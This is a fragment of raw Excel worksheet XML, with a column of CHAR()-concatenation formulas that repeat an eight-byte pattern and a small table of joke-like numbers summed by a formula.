    <row r="996" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C996" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>ûÏ&gt;±ÖÈ!¥ûÏ</v>
      </c>
    </row>
    <row r="997" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C997" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>&gt;±ÖÈ!¥ûÏ&gt;±</v>
      </c>
    </row>
    <row r="998" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C998" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÈ!¥ûÏ&gt;±ÖÈ</v>
      </c>
    </row>
    <row r="999" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C999" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>!¥ûÏ&gt;±ÖÈ!¥</v>
      </c>
    </row>
    <row r="1000" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C1000" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>ûÏ&gt;±ÖÈ!¥ûÏ</v>
      </c>
    </row>
    <row r="1001" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C1001" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>&gt;±ÖÈ!¥ûÏ&gt;±</v>
      </c>
    </row>
    <row r="1002" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C1002" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÈ!¥ûÏ&gt;±ÖÈ</v>
      </c>
    </row>
    <row r="1003" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C1003" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>!¥ûÏ&gt;±ÖÈ!¥</v>
      </c>
    </row>
    <row r="1004" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C1004" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>ûÏ&gt;±ÖÈ!¥ûÏ</v>
      </c>
    </row>
    <row r="1005" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C1005" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>&gt;±ÖÈ!¥ûÏ&gt;±</v>
      </c>
    </row>
    <row r="1006" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C1006" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÈ!¥ûÏ&gt;±ÖÈ</v>
      </c>
    </row>
    <row r="1007" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C1007" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>!¥ûÏ&gt;±ÖÈ!¥</v>
      </c>
    </row>
    <row r="1008" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C1008" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>ûÏ&gt;±ÖÈ!¥ûÏ</v>
      </c>
    </row>
    <row r="1009" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C1009" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>&gt;±ÖÈ!¥ûÏ&gt;±</v>
      </c>
    </row>
    <row r="1010" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C1010" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÈ!¥ûÏ&gt;±ÖÈ</v>
      </c>
    </row>
    <row r="1011" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C1011" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>!¥ûÏ&gt;±ÖÈ!¥</v>
      </c>
    </row>
    <row r="1012" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C1012" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>ûÏ&gt;±ÖÈ!¥ûÏ</v>
      </c>
    </row>
    <row r="1013" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C1013" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>&gt;±ÖÈ!¥ûÏ&gt;±</v>
      </c>
    </row>
    <row r="1014" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C1014" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÈ!¥ûÏ&gt;±ÖÈ</v>
      </c>
    </row>
    <row r="1015" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C1015" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>!¥ûÏ&gt;±ÖÈ!¥</v>
      </c>
    </row>
    <row r="1016" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C1016" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>ûÏ&gt;±ÖÈ!¥ûÏ</v>
      </c>
    </row>
    <row r="1017" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C1017" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>&gt;±ÖÈ!¥ûÏ&gt;±</v>
      </c>
    </row>
    <row r="1018" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C1018" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÈ!¥ûÏ&gt;±ÖÈ</v>
      </c>
    </row>
    <row r="1019" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C1019" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)</f>
        <v>!¥ûÏ&gt;±ÖÈ!¥</v>
      </c>
    </row>
    <row r="1020" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C1020" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)</f>
        <v>ûÏ&gt;±ÖÈ!¥ûÏ</v>
      </c>
    </row>
    <row r="1021" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C1021" t="str">
        <f>CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>&gt;±ÖÈ!¥ûÏ&gt;±</v>
      </c>
    </row>
    <row r="1022" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C1022" t="str">
        <f>CHAR(214)&amp;CHAR(200)&amp;CHAR(33)&amp;CHAR(165)&amp;CHAR(251)&amp;CHAR(207)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(200)</f>
        <v>ÖÈ!¥ûÏ&gt;±ÖÈ</v>
      </c>
    </row>
    <row r="1023" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C1023" t="str">
        <f>CHAR(33)&amp;CHAR(165)&amp;CHAR(251)</f>
        <v>!¥û</v>
      </c>
    </row>
    <row r="1024" spans="3:3" x14ac:dyDescent="0.25">
      <c r="C1024" t="s">
        <v>0</v>
      </c>
    </row>
  </sheetData>
  <pageMargins left="0.7" right="0.7" top="0.75" bottom="0.75" header="0.3" footer="0.3"/>
  <pageSetup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F3:I20"/>
  <sheetViews>
    <sheetView tabSelected="1" workbookViewId="0">
      <selection activeCell="F21" sqref="F21"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="6" max="6" width="18.7109375" bestFit="1" customWidth="1"/>
    <col min="7" max="7" width="22.42578125" bestFit="1" customWidth="1"/>
    <col min="8" max="8" width="11.140625" style="2" bestFit="1" customWidth="1"/>
    <col min="9" max="9" width="62.28515625" bestFit="1" customWidth="1"/>
  </cols>
  <sheetData>
    <row r="3" spans="6:9" ht="15.75" thickBot="1" x14ac:dyDescent="0.3">
      <c r="F3" s="1" t="s">
        <v>1</v>
      </c>
      <c r="G3" s="1"/>
      <c r="H3" s="1"/>
      <c r="I3" s="1"/>
    </row>
    <row r="4" spans="6:9" x14ac:dyDescent="0.25">
      <c r="F4" s="5"/>
      <c r="G4" s="6"/>
      <c r="H4" s="7"/>
      <c r="I4" s="8" t="s">
        <v>10</v>
      </c>
    </row>
    <row r="5" spans="6:9" x14ac:dyDescent="0.25">
      <c r="F5" s="9" t="s">
        <v>2</v>
      </c>
      <c r="G5" s="3" t="s">
        <v>3</v>
      </c>
      <c r="H5" s="4">
        <v>256</v>
      </c>
      <c r="I5" s="10" t="s">
        <v>11</v>
      </c>
    </row>
    <row r="6" spans="6:9" x14ac:dyDescent="0.25">
      <c r="F6" s="9"/>
      <c r="G6" s="3" t="s">
        <v>8</v>
      </c>
      <c r="H6" s="4">
        <v>69</v>
      </c>
      <c r="I6" s="10" t="s">
        <v>9</v>
      </c>
    </row>
    <row r="7" spans="6:9" x14ac:dyDescent="0.25">
      <c r="F7" s="9"/>
      <c r="G7" s="3" t="s">
        <v>4</v>
      </c>
      <c r="H7" s="4">
        <v>420</v>
      </c>
      <c r="I7" s="10" t="s">
        <v>7</v>
      </c>
    </row>
    <row r="8" spans="6:9" x14ac:dyDescent="0.25">
      <c r="F8" s="9"/>
    </row>
    <row r="9" spans="6:9" x14ac:dyDescent="0.25">
      <c r="F9" s="9"/>
      <c r="G9" s="3"/>
      <c r="H9" s="4"/>
      <c r="I9" s="10"/>
    </row>
    <row r="10" spans="6:9" x14ac:dyDescent="0.25">
      <c r="F10" s="9" t="s">
        <v>5</v>
      </c>
      <c r="G10" s="3" t="s">
        <v>6</v>
      </c>
      <c r="H10" s="4">
        <v>19.989999999999998</v>
      </c>
      <c r="I10" s="10"/>
    </row>
    <row r="11" spans="6:9" x14ac:dyDescent="0.25">
      <c r="F11" s="9"/>
      <c r="G11" s="3"/>
      <c r="H11" s="4"/>
      <c r="I11" s="10"/>
    </row>
    <row r="12" spans="6:9" x14ac:dyDescent="0.25">
      <c r="F12" s="9" t="s">
        <v>12</v>
      </c>
      <c r="G12" s="3" t="s">
        <v>13</v>
      </c>
      <c r="H12" s="4">
        <v>666</v>
      </c>
      <c r="I12" s="10"/>
    </row>
    <row r="13" spans="6:9" x14ac:dyDescent="0.25">
      <c r="F13" s="9"/>
      <c r="G13" s="3" t="s">
        <v>14</v>
      </c>
      <c r="H13" s="4">
        <v>100000</v>
      </c>
      <c r="I13" s="10"/>
    </row>
    <row r="14" spans="6:9" x14ac:dyDescent="0.25">
      <c r="F14" s="9"/>
      <c r="G14" s="3" t="s">
        <v>15</v>
      </c>
      <c r="H14" s="4">
        <v>10000</v>
      </c>
      <c r="I14" s="10"/>
    </row>
    <row r="15" spans="6:9" x14ac:dyDescent="0.25">
      <c r="F15" s="9"/>
      <c r="G15" s="3" t="s">
        <v>24</v>
      </c>
      <c r="H15" s="4">
        <v>1337</v>
      </c>
      <c r="I15" s="10" t="s">
        <v>25</v>
      </c>
    </row>
    <row r="16" spans="6:9" x14ac:dyDescent="0.25">
      <c r="F16" s="9"/>
      <c r="G16" s="3"/>
      <c r="H16" s="4"/>
      <c r="I16" s="10"/>
    </row>
    <row r="17" spans="6:9" x14ac:dyDescent="0.25">
      <c r="F17" s="19" t="s">
        <v>19</v>
      </c>
      <c r="G17" s="20" t="s">
        <v>18</v>
      </c>
      <c r="H17" s="21">
        <v>27000</v>
      </c>
      <c r="I17" s="22" t="s">
        <v>17</v>
      </c>
    </row>
    <row r="18" spans="6:9" x14ac:dyDescent="0.25">
      <c r="F18" s="19"/>
      <c r="G18" s="20" t="s">
        <v>23</v>
      </c>
      <c r="H18" s="21">
        <v>35</v>
      </c>
      <c r="I18" s="22" t="s">
        <v>22</v>
      </c>
    </row>
    <row r="19" spans="6:9" ht="15.75" thickBot="1" x14ac:dyDescent="0.3">
      <c r="F19" s="11"/>
      <c r="G19" s="12" t="s">
        <v>20</v>
      </c>
      <c r="H19" s="13">
        <v>115</v>
      </c>
      <c r="I19" s="14" t="s">
        <v>21</v>
      </c>
    </row>
    <row r="20" spans="6:9" ht="15.75" thickBot="1" x14ac:dyDescent="0.3">
      <c r="F20" s="15" t="s">
        <v>26</v>
      </c>
      <c r="G20" s="16"/>
      <c r="H20" s="17">
        <f>SUM(H5:H19)</f>
        <v>139917.99</v>
      </c>
      <c r="I20" s="18" t="s">
        <v>16</v>
      </c>
    </row>
  </sheetData>
  <mergeCells count="1">
    <mergeCell ref="F3:I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32BIT</dc:creator>
  <cp:lastModifiedBy>32BIT</cp:lastModifiedBy>
  <dcterms:created xsi:type="dcterms:W3CDTF">2015-06-05T18:17:20Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2021-03-02T00:58:53Z</dcterms:modified>
</cp:coreProperties>
</file>